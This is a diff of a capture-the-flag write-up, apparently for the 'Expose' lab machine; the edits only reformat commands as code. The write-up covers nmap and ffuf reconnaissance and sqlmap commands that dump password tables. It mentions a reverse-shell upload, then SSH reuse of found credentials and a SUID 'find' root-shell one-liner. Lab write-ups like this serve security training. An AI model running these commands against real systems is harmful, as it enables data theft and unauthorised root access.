@@ -1,4 +1,4 @@
-To check my VPN connection was working I started with "ping -c4 10.10.116.11". Everything seems to be working fine so let's start.
+To check my VPN connection was working I started with `ping -c4 10.10.116.11`. Everything seems to be working fine so let's start.
 I ran 
 ````
 sudo nmap -sS -p- 10.10.116.111
@@ -103,8 +103,8 @@ Nmap done: 1 IP address (1 host up) scanned in 24.93 seconds
 ````
 
 So there is FTP, SSH, DNS domain, waste p2p encrypted file sharing software, and MQTT which is a home automation protocol running.
-FTP server allows anonymous login without a password so let's start there. There are no files but the welcome message is "220 Welcome to the Expose Web Challenge.".
-Went to "http://10.10.116.111:1337" with the browser and got a plank page with "EXPOSED" in it. Let's use ffuf to try to find some directories.
+FTP server allows anonymous login without a password so let's start there. There are no files but the welcome message is `220 Welcome to the Expose Web Challenge.`.
+Went to `http://10.10.116.111:1337` with the browser and got a plank page with "EXPOSED" in it. Let's use ffuf to try to find some directories.
 ````
 ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.116.111:1337/FUZZ
 ````
@@ -112,11 +112,11 @@ found "/admin, /admin_101, /javascript, /phpmyadmin & /server-status".
 
 "/admin, /admin_101 & /phpmyadmin" all have login pages but "/admin" states "Is this the right admin portal?". Testing "/admin" login does not really do anything so let's look at the "/admin_101" next.
 Used burp to proxy the request to a file for sqlmap to test for injection vulnerabilities. 
-"sqlmap -l req --level=4 --risk=2" tells that backend server seems to be "MySQL" 
-"sqlmap -l req --dbms=MySQL --dbs" found "[*] expose,[*] information_schema,[*] mysql,[*] performance_schema,[*] phpmyadmin,[*] sys" databases.
-"sqlmap -l req --dbms=MySQL -D expose,mysql,phpmyadmin --tables" dumps tables from databases "expose,mysql,phpmyadmin".
+`sqlmap -l req --level=4 --risk=2` tells that backend server seems to be "MySQL 
+`sqlmap -l req --dbms=MySQL --dbs` found "[*] expose,[*] information_schema,[*] mysql,[*] performance_schema,[*] phpmyadmin,[*] sys" databases.
+`sqlmap -l req --dbms=MySQL -D expose,mysql,phpmyadmin --tables` dumps tables from databases "expose,mysql,phpmyadmin".
 I started with expose database. There were "user, config" tables so lets find out columns for "user" table. 
-"sqlmap -l req --dbms=MySQL -D expose -T user --columns" found "created,email,id,password" columns so let's dump them!
+`sqlmap -l req --dbms=MySQL -D expose -T user --columns` found "created,email,id,password" columns so let's dump them!
 ````
 +-----------------+----+--------------------------------------+
 | email           | id | password                             |
@@ -126,7 +126,7 @@ I started with expose database. There were "user, config" tables so lets find ou
 ````
 This grants login to "/admin_101" but there is nothing.
 
-"sqlmap -l req --dbms=MySQL -D expose -T config --dump" gives more interesting output
+`sqlmap -l req --dbms=MySQL -D expose -T config --dump` gives more interesting output
 ````
 +----+------------------------------+-----------------------------------------------------+
 | id | url                          | password                                            |
@@ -159,10 +159,10 @@ The site says "File uploaded successfully! Maybe look in source code to see the 
 I start a listener port the port in the reverse shell and execute our reverse shell by just clicking the file and we got our shell!
 
 I looked at the folder I landed in but there was nothing. Checked home folders of "ubuntu" and "zeamkish". In zeamkish folder was a file named "ssh_creds.txt"!
-Let's try them for ssh "ssh zeamkish@10.10.116.111" and we are in as zeamkish.
+Let's try them for ssh `ssh zeamkish@10.10.116.111` and we are in as zeamkish.
 
 I uploaded "linpeas.sh" to help with enumeration. There is an uncommon binary with suid bit.
--rwsr-x--- 1 root zeamkish 313K Feb 18  2020 /usr/bin/find
+`-rwsr-x--- 1 root zeamkish 313K Feb 18  2020 /usr/bin/find`
 
-I had a look at gtfobins and found that you can spawn a privileged shell with: "./find . -exec /bin/sh -p \; -quit"
-The flag was "/root/flag.txt"
+I had a look at gtfobins and found that you can spawn a privileged shell with: `./find . -exec /bin/sh -p \; -quit`
+The flag was `/root/flag.txt`
